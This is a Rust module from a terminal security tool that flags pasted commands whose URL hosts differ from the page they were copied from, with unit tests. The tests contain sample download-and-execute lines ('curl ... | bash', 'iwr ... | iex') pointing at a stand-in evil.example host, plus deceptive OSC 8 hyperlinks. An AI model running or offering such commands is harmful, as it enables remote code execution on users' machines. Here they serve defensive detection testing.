//! M12 ch1 — paste provenance ([`RuleId::PasteSourceMismatch`]).
//!
//! A companion browser extension (a SEPARATE repo) writes a JSON record at
//! `state_dir()/clipboard_source.json` every time it sets the clipboard:
//!
//! ```json
//! {"updated_at": "<rfc3339>", "content_sha256": "<hex>",
//!  "source_url": "<url>", "source_title": "<string>",
//!  "hidden_text_detected": <bool>}
//! ```
//!
//! tirith READS (never writes) that record and attributes a paste to its source
//! page. Fires from `engine::analyze` in [`ScanContext::Paste`] ONLY.
//!
//! Semantics: an absent/malformed record → no finding (fail-safe). A
//! `sha256(raw)` that does not match `content_sha256` → no attribution, no
//! finding (a stale record must never falsely attribute an unrelated paste). On
//! a hash match, compare destination URL host(s) against the `source_url` host;
//! a bare mismatch is [`Severity::Info`] (docs pages legitimately link other
//! hosts), escalating to [`Severity::High`] given ≥1 risk signal:
//! (a) `hidden_text_detected` or a prior `ClipboardHidden`;
//! (b) a destination is a known URL shortener;
//! (c) a prior pipe-to-shell finding;
//! (d) a destination not in `policy.allowed_install_domains`;
//! (e) an OSC 8 hyperlink whose visible URL host differs from its `href`.
//!
//! The trigger is runtime companion-file state + a content-hash match, not a
//! regex/byte signal, so this carries NO PATTERN_TABLE entry and lives in
//! `EXTERNALLY_TRIGGERED_RULES`; the engine forces past its paste tier-1
//! fast-exit only when the companion file is non-empty (`paste_source_triggered`
//! in `engine.rs`). The finding echoes ONLY the source host, the mismatched
//! destination host(s), and which signals fired — never the pasted content.

use crate::clipboard::ClipboardSourceRecord;
use crate::policy::Policy;
use crate::tokenize::ShellType;
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Production entry point. Reads the companion record from the default path and
/// evaluates `input` against it. `prior` carries the paste branch's
/// already-assembled findings; `shell` is the caller's shell for host
/// extraction. `raw` is the ORIGINAL clipboard bytes — the content-hash runs
/// over THEM (not the lossy `input`) so a non-UTF-8 paste still matches. Returns
/// at most one finding.
pub fn check(
    input: &str,
    raw: &[u8],
    shell: ShellType,
    prior: &[Finding],
    policy: &Policy,
) -> Vec<Finding> {
    let record = match crate::clipboard::read_source_record() {
        Some(r) => r,
        None => return Vec::new(),
    };
    check_with_record(input, raw, shell, prior, policy, &record)
}

/// Test seam: evaluate against an explicit [`ClipboardSourceRecord`] instead of
/// reading from disk (mirrors the canary/taint/incident `*_at` seams). `raw` is
/// the ORIGINAL clipboard bytes hashed for attribution; see [`check`].
pub fn check_with_record(
    input: &str,
    raw: &[u8],
    shell: ShellType,
    prior: &[Finding],
    policy: &Policy,
    record: &ClipboardSourceRecord,
) -> Vec<Finding> {
    // Attribution: a hash mismatch means this paste did NOT come from the
    // recorded source — emit nothing. A stale record must never falsely
    // attribute an unrelated paste (load-bearing guard). Hash the ORIGINAL
    // `raw`, not the lossy `input`, so a non-UTF-8 paste still matches.
    if !record.matches_bytes(raw) {
        return Vec::new();
    }

    // A source_url with no host (file://, unparseable) can't be compared.
    let Some(source_host) = url_host(&record.source_url) else {
        return Vec::new();
    };

    // Destination hosts from plain URLs PLUS OSC 8 hyperlink targets (an OSC
    // 8-only link to another host is exactly the escalation signal to catch).
    // Nothing to compare → no finding.
    let dest_hosts = destination_hosts(input, shell);
    if dest_hosts.is_empty() {
        return Vec::new();
    }

    // Destination hosts that differ from the source host.
    let mismatched: Vec<String> = dest_hosts
        .iter()
        .filter(|h| !hosts_match(&source_host, h))
        .cloned()
        .collect();
    if mismatched.is_empty() {
        return Vec::new();
    }

    // Any one risk signal escalates the mismatch to High.
    let signals = collect_risk_signals(input, prior, policy, record, &mismatched);
    let severity = if signals.is_empty() {
        Severity::Info
    } else {
        Severity::High
    };

    vec![build_finding(&source_host, &mismatched, &signals, severity)]
}

/// Parse a URL string and return its lowercase host, or `None`. Tries
/// `url::Url` first, then a scheme-less `host[/path]` fallback.
fn url_host(s: &str) -> Option<String> {
    let s = s.trim();
    if let Ok(u) = url::Url::parse(s) {
        return u.host_str().map(|h| h.to_ascii_lowercase());
    }
    // Scheme-less fallback: first chunk before path/query/fragment, must look
    // like a dotted hostname.
    let first = s.split(['/', '?', '#']).next().unwrap_or(s);
    let host_only = first.split('@').next_back().unwrap_or(first);
    let host_only = host_only.split(':').next().unwrap_or(host_only);
    if host_only.contains('.')
        && host_only.split('.').all(|seg| {
            !seg.is_empty() && seg.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
        })
    {
        return Some(host_only.to_ascii_lowercase());
    }
    None
}

/// Deduped, lowercase destination hosts from every URL in the pasted command
/// (via the shipping URL extractor, threaded with `shell`), PLUS any OSC 8
/// hyperlink TARGET (`href`) host — so a paste whose only outbound URL is an
/// OSC 8 link still produces a destination to compare.
fn destination_hosts(input: &str, shell: ShellType) -> Vec<String> {
    let mut hosts: Vec<String> = Vec::new();
    let mut push = |h: String| {
        if !hosts.contains(&h) {
            hosts.push(h);
        }
    };
    for url in crate::extract::extract_urls(input, shell) {
        if let Some(h) = url.parsed.host() {
            push(h.to_ascii_lowercase());
        }
    }
    let mut state = crate::extract::OutputScanState::default();
    let mut result = crate::extract::OutputScanResult::default();
    crate::extract::scan_output_chunk(input.as_bytes(), &mut state, &mut result);
    for link in &result.hyperlinks {
        if let Some(h) = url_host(&link.uri) {
            push(h);
        }
    }
    hosts
}

/// Compare two hosts: case-insensitive, treating a leading `www.` as equivalent.
fn hosts_match(a: &str, b: &str) -> bool {
    let a = a.trim_start_matches("www.");
    let b = b.trim_start_matches("www.");
    a.eq_ignore_ascii_case(b)
}

/// `true` when `host` is covered by `allowed`: an exact (case-insensitive) match
/// OR a dot-suffix subdomain (`github.com` covers `objects.github.com`, not
/// `evilgithub.com`).
pub fn host_in_allowed_domains(host: &str, allowed: &[String]) -> bool {
    // Lowercase BEFORE stripping `www.` (CodeRabbit R5) so an uppercase `WWW.`
    // still matches.
    let host = host.trim().to_ascii_lowercase();
    let host = host.trim_start_matches("www.");
    allowed.iter().any(|d| {
        let d = d.trim().to_ascii_lowercase();
        let d = d.trim_start_matches("www.");
        if d.is_empty() {
            return false;
        }
        host == d || host.ends_with(&format!(".{d}"))
    })
}

/// Human-readable risk-signal labels in detection order, naming which signals
/// escalated the mismatch to High.
fn collect_risk_signals(
    input: &str,
    prior: &[Finding],
    policy: &Policy,
    record: &ClipboardSourceRecord,
    mismatched: &[String],
) -> Vec<&'static str> {
    let mut signals: Vec<&'static str> = Vec::new();

    // (a) hidden text — extension flag or a prior ClipboardHidden finding.
    if record.hidden_text_detected {
        signals.push("source recorded hidden text");
    } else if prior.iter().any(|f| f.rule_id == RuleId::ClipboardHidden) {
        signals.push("hidden clipboard content detected");
    }

    // (b) a destination host is a known URL shortener.
    if mismatched
        .iter()
        .any(|h| crate::rules::shared::is_url_shortener(h))
    {
        signals.push("destination is a URL shortener");
    }

    // (c) the paste pipes into a shell interpreter. Match the whole pipe-to-shell
    //     family — `curl … | bash` fires `CurlPipeShell`, not `PipeToInterpreter`.
    if prior.iter().any(|f| {
        matches!(
            f.rule_id,
            RuleId::PipeToInterpreter
                | RuleId::CurlPipeShell
                | RuleId::WgetPipeShell
                | RuleId::HttpiePipeShell
                | RuleId::XhPipeShell
                | RuleId::PsInlineDownloadExecute
        )
    }) {
        signals.push("paste pipes to a shell interpreter");
    }

    // (d) a destination is NOT in the operator's install-source list. An empty
    //     list never fires (opt-in, backward-compatible).
    if !policy.allowed_install_domains.is_empty()
        && mismatched
            .iter()
            .any(|h| !host_in_allowed_domains(h, &policy.allowed_install_domains))
    {
        signals.push("destination not in allowed_install_domains");
    }

    // (e) an OSC 8 hyperlink's visible URL host differs from its click target.
    if has_osc8_host_mismatch(input) {
        signals.push("OSC 8 visible URL differs from its target");
    }

    signals
}

/// `true` when an OSC 8 hyperlink's VISIBLE text parses as a URL whose host
/// differs from the link's `uri` host. Non-URL visible text ("click here") does
/// NOT count — matching `OutputTerminalHyperlinkMismatch` on the output path.
fn has_osc8_host_mismatch(input: &str) -> bool {
    let mut state = crate::extract::OutputScanState::default();
    let mut result = crate::extract::OutputScanResult::default();
    crate::extract::scan_output_chunk(input.as_bytes(), &mut state, &mut result);
    result.hyperlinks.iter().any(|link| {
        match (url_host(&link.uri), url_host(link.visible.trim())) {
            (Some(href_host), Some(visible_host)) => !hosts_match(&href_host, &visible_host),
            // Visible text isn't a URL → tolerated (friendly-label pattern).
            _ => false,
        }
    })
}

/// Build the single [`RuleId::PasteSourceMismatch`] finding. Names the source
/// host, the mismatched destination host(s), and (when High) the risk signals;
/// the pasted content and full URLs are NOT echoed.
fn build_finding(
    source_host: &str,
    mismatched: &[String],
    signals: &[&'static str],
    severity: Severity,
) -> Finding {
    let dest_list = mismatched.join(", ");
    let description = if signals.is_empty() {
        format!(
            "This paste matched a recorded clipboard source on host '{source_host}', but it \
             runs a command targeting a different host ({dest_list}). A host mismatch on its own \
             is common and benign — documentation pages routinely link install URLs on other \
             hosts — so this is an advisory note only. Confirm the destination is the install \
             source you expect."
        )
    } else {
        format!(
            "This paste matched a recorded clipboard source on host '{source_host}', but it \
             runs a command targeting a different host ({dest_list}), AND it carries risk \
             signals: {}. This is the shape of a clipboard-hijack / copy-paste-poisoning \
             attack. Do not run the command; re-copy the install line directly from the \
             vendor's canonical page.",
            signals.join("; ")
        )
    };

    let mut evidence = vec![Evidence::HostComparison {
        raw_host: dest_list,
        similar_to: source_host.to_string(),
    }];
    if !signals.is_empty() {
        evidence.push(Evidence::Text {
            detail: format!("risk signals: {}", signals.join("; ")),
        });
    }

    Finding {
        rule_id: RuleId::PasteSourceMismatch,
        severity,
        title: "Pasted command targets a different host than its clipboard source".to_string(),
        description,
        evidence,
        human_view: None,
        agent_view: None,
        mitre_id: Some("T1059".to_string()),
        custom_rule_id: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Record whose `content_sha256` matches `content` (attribution passes).
    fn record_for(content: &str, source_url: &str, hidden: bool) -> ClipboardSourceRecord {
        ClipboardSourceRecord {
            updated_at: "2026-05-30T00:00:00Z".to_string(),
            content_sha256: crate::clipboard::content_sha256_hex(content.as_bytes()),
            source_url: source_url.to_string(),
            source_title: "Test Page".to_string(),
            hidden_text_detected: hidden,
        }
    }

    /// Record whose `content_sha256` matches the given RAW bytes (possibly
    /// invalid UTF-8), as the browser extension hashes them.
    fn record_for_bytes(raw: &[u8], source_url: &str) -> ClipboardSourceRecord {
        ClipboardSourceRecord {
            updated_at: "2026-05-30T00:00:00Z".to_string(),
            content_sha256: crate::clipboard::content_sha256_hex(raw),
            source_url: source_url.to_string(),
            source_title: "Test Page".to_string(),
            hidden_text_detected: false,
        }
    }

    fn empty_policy() -> Policy {
        Policy::default()
    }

    /// A prior finding of the given rule (as the paste branch would assemble).
    fn prior_finding(rule_id: RuleId) -> Finding {
        Finding {
            rule_id,
            severity: Severity::High,
            title: "prior".to_string(),
            description: "prior".to_string(),
            evidence: vec![],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }
    }

    // sha mismatch → no finding.
    #[test]
    fn sha_mismatch_emits_nothing() {
        let content = "curl https://evil.example/x.sh | bash";
        // Record's hash is for DIFFERENT content, so attribution fails.
        let rec = record_for(
            "totally different content",
            "https://docs.trusted.example",
            false,
        );
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &[],
            &empty_policy(),
            &rec,
        );
        assert!(
            findings.is_empty(),
            "a paste whose hash does not match the source must not be attributed"
        );
    }

    // Round-3 regression (#1b): a NON-UTF-8 paste must be attributed by hashing
    // the ORIGINAL raw bytes, not the lossy &str (the lossy decode would diverge
    // and miss the match). Raw bytes carry a curl line + a lone 0xFF; mismatch
    // fires at Info.
    #[test]
    fn non_utf8_paste_hashes_raw_bytes_not_lossy() {
        // Valid ASCII command + one invalid UTF-8 byte (0xFF) in a trailing token.
        let mut raw = b"curl https://evil.example/x.sh -o x #".to_vec();
        raw.push(0xFF);
        let lossy = String::from_utf8_lossy(&raw).into_owned();

        // Sanity: raw bytes are NOT valid UTF-8, so the lossy bytes diverge.
        assert!(std::str::from_utf8(&raw).is_err());
        assert_ne!(
            lossy.as_bytes(),
            raw.as_slice(),
            "test premise: lossy decode must differ from the raw bytes"
        );

        // The record's hash is over the RAW bytes (what the extension computed).
        let rec = record_for_bytes(&raw, "https://docs.trusted.example/install");

        // The engine passes the lossy &str as `input` but the raw bytes as `raw`.
        let findings =
            check_with_record(&lossy, &raw, ShellType::Posix, &[], &empty_policy(), &rec);
        assert_eq!(
            findings.len(),
            1,
            "a non-UTF-8 paste must be attributed by its raw-byte hash; got {findings:?}"
        );
        assert_eq!(findings[0].rule_id, RuleId::PasteSourceMismatch);

        // Other side of the lockstep: hashing the lossy &str (the old bug) would
        // NOT match, so passing lossy bytes as `raw` yields nothing.
        let nothing = check_with_record(
            &lossy,
            lossy.as_bytes(),
            ShellType::Posix,
            &[],
            &empty_policy(),
            &rec,
        );
        assert!(
            nothing.is_empty(),
            "hashing the lossy &str must NOT match the raw-byte record (proves the fix)"
        );
    }

    // (c) matched + same host → no finding.
    #[test]
    fn matched_same_host_emits_nothing() {
        let content = "curl https://docs.trusted.example/install.sh -o install.sh";
        let rec = record_for(content, "https://docs.trusted.example/page", false);
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &[],
            &empty_policy(),
            &rec,
        );
        assert!(
            findings.is_empty(),
            "no host mismatch (same host) must not fire; got {findings:?}"
        );
    }

    // (d) matched + bare host mismatch → Info.
    #[test]
    fn matched_bare_host_mismatch_is_info() {
        let content = "curl https://github.com/org/repo/releases/download/v1/tool -o tool";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &[],
            &empty_policy(),
            &rec,
        );
        assert_eq!(
            findings.len(),
            1,
            "a bare host mismatch must fire one finding"
        );
        assert_eq!(findings[0].rule_id, RuleId::PasteSourceMismatch);
        assert_eq!(
            findings[0].severity,
            Severity::Info,
            "a bare host mismatch is advisory Info"
        );
    }

    // (e) matched + host mismatch + pipe-to-interpreter → High.
    #[test]
    fn matched_mismatch_with_pipe_is_high() {
        let content = "curl https://evil.example/x.sh | bash";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        // The paste branch already assembled a PipeToInterpreter finding.
        let prior = [prior_finding(RuleId::PipeToInterpreter)];
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &prior,
            &empty_policy(),
            &rec,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "mismatch + pipe-to-interpreter must be High"
        );
        assert!(findings[0]
            .description
            .contains("pipes to a shell interpreter"));
    }

    // `curl … | bash` fires `CurlPipeShell`, not `PipeToInterpreter`; the signal
    // must match the whole pipe-to-shell family.
    #[test]
    fn matched_mismatch_with_curl_pipe_shell_is_high() {
        let content = "curl https://evil.example/x.sh | bash";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let prior = [prior_finding(RuleId::CurlPipeShell)];
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &prior,
            &empty_policy(),
            &rec,
        );
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "CurlPipeShell must escalate the mismatch just like PipeToInterpreter"
        );
    }

    // (e') hidden-text signal (record flag) → High.
    #[test]
    fn matched_mismatch_with_hidden_text_flag_is_high() {
        let content = "curl https://other.example/install.sh -o install.sh";
        let rec = record_for(content, "https://docs.trusted.example/install", true);
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &[],
            &empty_policy(),
            &rec,
        );
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].description.contains("hidden text"));
    }

    // (e'') hidden-text signal (prior ClipboardHidden finding) → High.
    #[test]
    fn matched_mismatch_with_prior_clipboard_hidden_is_high() {
        let content = "curl https://other.example/install.sh -o install.sh";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let prior = [prior_finding(RuleId::ClipboardHidden)];
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &prior,
            &empty_policy(),
            &rec,
        );
        assert_eq!(findings[0].severity, Severity::High);
    }

    // (f) matched + host mismatch + shortened URL → High.
    #[test]
    fn matched_mismatch_with_shortener_is_high() {
        let content = "curl https://bit.ly/abc123 -o tool";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &[],
            &empty_policy(),
            &rec,
        );
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "a shortened destination escalates the mismatch"
        );
        assert!(findings[0].description.contains("URL shortener"));
    }

    // (g) destination in allowed_install_domains → stays Info.
    #[test]
    fn matched_mismatch_destination_in_allowed_domains_stays_info() {
        let content = "curl https://github.com/org/repo/releases/download/v1/tool -o tool";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let mut policy = empty_policy();
        policy.allowed_install_domains = vec!["github.com".to_string()];
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &[],
            &policy,
            &rec,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].severity,
            Severity::Info,
            "a destination in allowed_install_domains keeps the bare mismatch at Info"
        );
    }

    // (g') destination NOT in a NON-EMPTY allowed list → High (the not-in-list
    // risk signal fires).
    #[test]
    fn matched_mismatch_destination_not_in_allowed_domains_is_high() {
        let content = "curl https://random-host.example/install.sh -o install.sh";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let mut policy = empty_policy();
        policy.allowed_install_domains = vec!["github.com".to_string()];
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &[],
            &policy,
            &rec,
        );
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "a destination outside a configured allowed list escalates to High"
        );
        assert!(findings[0].description.contains("allowed_install_domains"));
    }

    #[test]
    fn host_in_allowed_domains_matches_subdomain_not_lookalike() {
        let allowed = vec!["github.com".to_string()];
        assert!(host_in_allowed_domains("github.com", &allowed));
        assert!(host_in_allowed_domains("objects.github.com", &allowed));
        assert!(host_in_allowed_domains("www.github.com", &allowed));
        assert!(!host_in_allowed_domains("evilgithub.com", &allowed));
        assert!(!host_in_allowed_domains(
            "github.com.evil.example",
            &allowed
        ));
        // CodeRabbit R5: case normalized before stripping `www.`.
        assert!(host_in_allowed_domains("WWW.GITHUB.COM", &allowed));
        assert!(host_in_allowed_domains("GitHub.com", &allowed));
        let allowed_www = vec!["WWW.GitHub.com".to_string()];
        assert!(host_in_allowed_domains("github.com", &allowed_www));
        assert!(host_in_allowed_domains("objects.github.com", &allowed_www));
    }

    #[test]
    fn no_destination_url_emits_nothing() {
        let content = "echo hello world";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        assert!(check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &[],
            &empty_policy(),
            &rec
        )
        .is_empty());
    }

    #[test]
    fn source_url_without_host_emits_nothing() {
        let content = "curl https://github.com/x -o x";
        let rec = record_for(content, "about:blank", false);
        assert!(check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &[],
            &empty_policy(),
            &rec
        )
        .is_empty());
    }

    #[test]
    fn www_prefix_is_equivalent_no_mismatch() {
        let content = "curl https://www.docs.trusted.example/install.sh -o x";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        assert!(
            check_with_record(
                content,
                content.as_bytes(),
                ShellType::Posix,
                &[],
                &empty_policy(),
                &rec
            )
            .is_empty(),
            "www. on the destination must be treated as the same host as the source"
        );
    }

    #[test]
    fn osc8_visible_url_mismatch_is_a_signal() {
        // OSC 8 visible `github.com`, target evil.example: the href is itself a
        // destination, so the mismatch fires AND the visible≠target signal
        // escalates to High (round-3 fix for the empty-destination early return).
        let content = "see \x1b]8;;https://evil.example/x\x1b\\github.com\x1b]8;;\x1b\\";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &[],
            &empty_policy(),
            &rec,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "an OSC 8 visible-vs-target host mismatch escalates to High"
        );
        assert!(findings[0].description.contains("OSC 8"));
    }

    // Round-3 regression (#1a): a paste whose ONLY outbound URL is an OSC 8 href
    // (no plain URL, visible label is "click here") must still produce a
    // destination and fire a BARE mismatch (Info) — isolating "OSC 8 href feeds
    // the destination set" from the visible≠target escalation signal.
    #[test]
    fn osc8_only_destination_fires_bare_mismatch() {
        let content = "run \x1b]8;;https://evil.example/install.sh\x1b\\click here\x1b]8;;\x1b\\";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::Posix,
            &[],
            &empty_policy(),
            &rec,
        );
        assert_eq!(
            findings.len(),
            1,
            "an OSC 8-only destination must still fire one finding; got {findings:?}"
        );
        assert_eq!(findings[0].rule_id, RuleId::PasteSourceMismatch);
        assert_eq!(
            findings[0].severity,
            Severity::Info,
            "a bare OSC 8 host mismatch (friendly visible label) is advisory Info"
        );
    }

    // A PowerShell paste must still detect a host mismatch: destination
    // extraction is threaded with `shell` so `iwr <url> | iex` tokenizes as
    // PowerShell (regression for the hardcoded-POSIX bug).
    #[test]
    fn powershell_paste_host_mismatch_is_detected() {
        let content = "iwr https://evil.example/x.ps1 | iex";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        // The inline-download-execute rule would already be in `prior`.
        let prior = [prior_finding(RuleId::PsInlineDownloadExecute)];
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::PowerShell,
            &prior,
            &empty_policy(),
            &rec,
        );
        assert_eq!(
            findings.len(),
            1,
            "a PowerShell paste targeting a different host must fire one finding; got {findings:?}"
        );
        assert_eq!(findings[0].rule_id, RuleId::PasteSourceMismatch);
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "PowerShell mismatch + inline download-execute must be High"
        );
    }

    // A bare PowerShell mismatch (no risk signal) is still surfaced at Info.
    #[test]
    fn powershell_bare_mismatch_is_info() {
        let content =
            "iwr https://github.com/org/repo/releases/download/v1/tool.exe -OutFile tool.exe";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let findings = check_with_record(
            content,
            content.as_bytes(),
            ShellType::PowerShell,
            &[],
            &empty_policy(),
            &rec,
        );
        assert_eq!(findings.len(), 1, "got {findings:?}");
        assert_eq!(findings[0].severity, Severity::Info);
    }
}
